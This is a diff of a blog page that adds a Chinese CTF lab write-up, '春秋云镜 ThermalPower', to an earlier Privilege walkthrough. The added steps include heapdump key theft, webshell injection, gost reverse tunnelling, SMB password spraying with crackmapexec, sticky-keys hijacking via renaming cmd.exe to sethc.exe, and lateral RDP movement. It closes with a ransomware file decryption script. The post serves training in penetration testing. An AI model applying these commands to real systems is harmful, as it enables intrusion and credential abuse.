@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>春秋云镜 Privilege | Godown_blog</title>
+  <title>春秋云镜 Privilege &amp; ThermalPower | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -598,7 +598,7 @@
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        春秋云镜 Privilege
+        春秋云镜 Privilege &amp; ThermalPower
       </span>
     </div>
     
@@ -619,7 +619,8 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h2 id="春秋云镜-Privilege"><a href="#春秋云镜-Privilege" class="headerlink" title="春秋云镜 Privilege"></a>春秋云镜 Privilege</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan看到开了8080和3306，应该是windows，还有个<a target="_blank" rel="noopener" href="http://www.zip备份文件/">www.zip备份文件</a></p>
+        <p>两个有点类似，一起</p>
+<h2 id="春秋云镜-Privilege"><a href="#春秋云镜-Privilege" class="headerlink" title="春秋云镜 Privilege"></a>春秋云镜 Privilege</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan看到开了8080和3306，应该是windows，还有个<a target="_blank" rel="noopener" href="http://www.zip备份文件/">www.zip备份文件</a></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108194806040.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108194806040.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260108194806040"></p>
 <p>访问8080，看到jenkins</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108192826951.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260108192826951.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260108192826951"></p>
@@ -755,7 +756,7 @@ Windows 环境： C:\Program Files\Jenkins\secrets\initialAdminPassword
 <p>根据上文，该权限对当前系统任意文件都有写权限</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109113828994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109113828994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109113828994"></p>
 <p>劫持一下粘滞键，因为粘滞键包是system权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\windows\system32</span><br><span class="line">ren sethc.exe sethc.bak</span><br><span class="line">ren cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren c:\windows\system32\sethc.exe c:\windows\system32\sethc.bak</span><br><span class="line">ren c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
 
 <p>rdp上去，Win+L进锁屏页面（千万别登陆进去，因为锁屏页面是system权限，登进去再按就是普通用户权限了），然后按5次shift</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109153905810.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109153905810.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109153905810"></p>
@@ -863,6 +864,100 @@ Windows 环境： C:\Program Files\Jenkins\secrets\initialAdminPassword
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109173211704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109173211704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109173211704"></p>
 <p>flag04: flag{e69b59c8-4b64-43ad-a8e3-c371f315826f}</p>
+<h2 id="春秋云镜-ThermalPower"><a href="#春秋云镜-ThermalPower" class="headerlink" title="春秋云镜 ThermalPower"></a>春秋云镜 ThermalPower</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan扫，有spring heapdump泄露</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195050104.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195050104.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109195050104"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://39.98.107.30:8080/actuator/heapdump">http://39.98.107.30:8080/actuator/heapdump</a></p>
+<p>JDumpSpider分析，找到Shiro key QZYysgMYhG6&#x2F;CzIJlVpR2g&#x3D;&#x3D;</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195617260.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195617260.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109195617260"></p>
+<p>直接上shiro工具，注个哥斯拉马</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195900274.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109195900274.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109195900274"></p>
+<p>进来就是root</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201610758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201610758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109201610758"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201649176.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109201649176.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109201649176"></p>
+<p>flag01: flag{e85614ea-b098-4b8e-b91a-af61ef4719d7}</p>
+<h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>上传fscan和gost</p>
+<p>当然fscan扫的时候shell也会卡住，要想完整的交互式shell还是得传vshell上去</p>
+<p>这里也能顺利扫完</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109202236234.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109202236234.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109202236234"></p>
+<p>整理一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.17.213 本机</span><br><span class="line">172.22.17.6 WORKGROUP\WIN-ENGINEER 有web服务</span><br><span class="line">172.22.17.6:21 FTP fscan扫出可匿名登陆</span><br></pre></td></tr></table></figure>
+
+<p>gost代理出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gost -L socks5://:5555?bind=true</span><br><span class="line"></span><br><span class="line">gost -L rtcp://:2222/39.98.107.30:22 -F socks5://39.98.107.30:5555</span><br></pre></td></tr></table></figure>
+
+<p>我曹里的，sb哥斯拉命令执行超时了会自己断掉终端，导致gost中途断掉（可以起gost后马上把那个终端窗口关掉，这样就不会触发shell管理器的关闭发送ctrl+c了，不过挂起时间长了还是会掉，二刷还是上vshell稳定）</p>
+<p>直接访问<a href="ftp://172.22.17.6/">ftp://172.22.17.6</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203215494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203215494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109203215494"></p>
+<p>直接看内部资料</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203303285.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109203303285.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109203303285"></p>
+<p>初始密码由账户名+@+工号组成，例如zhangsan@0801</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109204240242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109204240242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109204240242"></p>
+<p>这里有一个txt记录了账密，还有一个新的26网段，通讯录里有账号和工号</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109205618192"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109210106532.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109210106532.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109210106532"></p>
+<p>排个序，制作出密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">WIN-ENGINEER\chenhua/chenhua@0813</span><br><span class="line">WIN-ENGINEER\zhaoli/zhaoli@0821</span><br><span class="line">WIN-ENGINEER\wangning/wangning@0837</span><br><span class="line">WIN-ENGINEER\zhangling/zhangling@0871</span><br><span class="line">WIN-ENGINEER\zhangying/zhangying@0888</span><br><span class="line">WIN-ENGINEER\wangzhiqiang/wangzhiqiang@0901</span><br><span class="line">WIN-ENGINEER\chentao/chentao@0922</span><br><span class="line">WIN-ENGINEER\zhouyong/zhouyong@0939</span><br><span class="line">WIN-ENGINEER\lilong/lilong@1046</span><br><span class="line">WIN-ENGINEER\liyumei/liyumei@1048</span><br></pre></td></tr></table></figure>
+
+<p>域内喷洒一波，在kali 2024上依旧python版本过高，用的kali 2023，可以做user.txt和pass.txt两个字典，这里我先试了直接爆破rdp，结果socket一直error，无奈先爆破一首smb</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.17.6 -d xiaorang.lab -u ./user.txt -p ./pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破smb能秒出结果，也就是第一条就能登陆</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110200230531.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110200230531.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110200230531"></p>
+<p>把第一条删去后，发现zhaoli也能登陆，额其实每一条都能登陆，每个账户都是可用的。rdp上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q xfreerdp /u:chenhua /p:chenhua@0813 /v:172.22.17.6:3389</span><br></pre></td></tr></table></figure>
+
+<p>查看一下特权</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201009595.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201009595.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110201009595"></p>
+<p>Privilege靶场是利用evil-winrm（需要目标开了winrm服务）获取seRestore特权打粘滞劫持，SeBackupPrivilege打的卷影拷贝读出SAM和system，进而secretdump下hash</p>
+<p>这里有所有权限的介绍</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
+<p>比如表中的，SeChangeNotify就是人人享有的特权</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201652291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110201652291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110201652291"></p>
+<p>直接看别人wp，这里打SeBackupPrivilege，那么为什么可以打这个呢，又为什么只打这个呢</p>
+<p>net user chenhua查看当前的本地组（虽然这个组并没有什么实际意义</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110202410222.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110202410222.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110202410222"></p>
+<p>我就偏不打SeBackupPrivilege，就得打seRestore</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204146113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204146113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110204146113"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\EnableSeRestorePrivilege.ps1</span><br><span class="line">ren c:\windows\system32\sethc.exe c:\windows\system32\sethc.bak</span><br><span class="line">ren c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>成功拿下，根本不用卷影拷贝好吧</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204220376.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204220376.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110204220376"></p>
+<p>可以用用EnableSeBackupPrivilege打卷影拷贝，也可以用EnableSeRestorePrivilege打劫持</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1">https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204813605.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110204813605.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110204813605"></p>
+<p>好像不能copy，新添加一个administrator用户rdp上去</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205112306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205112306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110205112306"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205142301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205142301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110205142301"></p>
+<p>flag02: flag{1a62047c-7f28-44a1-8760-671da6b7d580}</p>
+<h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>这个不是我能做的了，随便划划水了</p>
+<p>扫这个新的网段 172.22.26.1&#x2F;24</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260109205618192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260109205618192"></p>
+<p>额cmd被劫持了，五次shift打开</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205625118.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110205625118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110205625118"></p>
+<p>扫到一个172.22.26.11主机，1433 (mssql?) 有弱口令sa 123456</p>
+<p>用Administrator&#x2F;IYnT3GyCiy3 rdp上去，这个mssql也就用不到了，不过这里不能通过最边界的机器去rdp了，因为跨网段了，用这个控制下来的172.22.17.6去rdp</p>
+<p>rdp套娃rdp了，进来先弹出wincc</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210451476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210451476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110210451476"></p>
+<p>点第三个泡泡得到flag3</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210655903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210655903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110210655903"></p>
+<p>flag{bcd080d5-2cf1-4095-ac15-fa4bef9ca1c0}</p>
+<h3 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h3><p>win+d最小化窗口返回桌面，桌面壁纸被换为了勒索壁纸，本来Desktop目录有flag04的。。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210904306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110210904306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110210904306"></p>
+<p>C盘下面能找到勒索病毒Lockyou.exe</p>
+<p>下面不会了，直接粘贴</p>
+<p>这个exe是.net程序（用linux的file命令可以知道）</p>
+<p>然后就用dnSpy反编译出来，看Encrypt的命令</p>
+<p>病毒使用<code>AESCrypto</code>加解密，需要拿到<code>AES_KEY</code>，而<code>AES_KEY</code>需要通过<code>privateKey</code>和<code>encryptedAesKey</code>才能得到。这两个文件在题目的百度网盘给出了</p>
+<p>通过网站<a target="_blank" rel="noopener" href="https://www.ssleye.com/ssltool/pem_xml.html%EF%BC%8C%E5%B0%86">https://www.ssleye.com/ssltool/pem_xml.html，将</a> XML 格式转成 PEM 格式，得到 <code>PRIVATE KEY</code></p>
+<p>然后通过[<a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/rsa%EF%BC%8C%E5%86%8D%E6%8A%8A">https://www.lddgo.net/encrypt/rsa，再把</a> <code>aes key</code>解出来，输入内容为<code>encryptedAesKey</code> 中加密的内容，解密后得到一串字符。</p>
+<p>然后一次AES解密桌面上的ScadaDB.sql.locky得到flag4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">AES_KEY = base64.b64decode(&quot;cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=&quot;)</span><br><span class="line"></span><br><span class="line">def decrypt_file(input_file, output_file):</span><br><span class="line">    aes_cipher = AES.new(AES_KEY, AES.MODE_CBC)</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        iv = f.read(16)</span><br><span class="line">        aes_cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)</span><br><span class="line">        with open(output_file, &#x27;wb&#x27;) as decrypted_file:</span><br><span class="line">            while True:</span><br><span class="line">                chunk = f.read(16)</span><br><span class="line">                if len(chunk) == 0:</span><br><span class="line">                    break</span><br><span class="line">                decrypted_chunk = aes_cipher.decrypt(chunk)</span><br><span class="line">                decrypted_file.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line">    print(&quot;解密完成&quot;)</span><br><span class="line"></span><br><span class="line">input_file = &quot;ScadaDB.sql.locky&quot;</span><br><span class="line">output_file = &quot;ScadaDB.sql&quot;  # 解密后的文件</span><br><span class="line">decrypt_file(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到最后一个flag</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110215141083.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110215141083.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260110215141083"></p>
 
       </div>
       <div class="post-tags-categories">
@@ -884,7 +979,7 @@ Windows 环境： C:\Program Files\Jenkins\secrets\initialAdminPassword
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2026/01/09/chun-qiu-yun-jing-privilege/" target="_blank" title="春秋云镜 Privilege">https://godownio.github.io/2026/01/09/chun-qiu-yun-jing-privilege/</a>
+    <a href="/2026/01/09/chun-qiu-yun-jing-privilege/" target="_blank" title="春秋云镜 Privilege &amp; ThermalPower">https://godownio.github.io/2026/01/09/chun-qiu-yun-jing-privilege/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -1138,7 +1233,7 @@ hibernate反序列化Hibernate 是一个广泛使用的开源对象关系映射�
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Privilege"><span class="toc-text">春秋云镜 Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Privilege"><span class="toc-text">春秋云镜 Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower"><span class="toc-text">春秋云镜 ThermalPower</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1-1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-1"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3-1"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4-1"><span class="toc-text">flag4</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
@@ -1182,7 +1277,7 @@ hibernate反序列化Hibernate 是一个广泛使用的开源对象关系映射�
                   <span class="post-date">01-09</span>
                 
               </div>
-              <a class="post-title" href="/2026/01/09/chun-qiu-yun-jing-privilege/">春秋云镜 Privilege</a>
+              <a class="post-title" href="/2026/01/09/chun-qiu-yun-jing-privilege/">春秋云镜 Privilege &amp; ThermalPower</a>
             </div>
           </div>
         
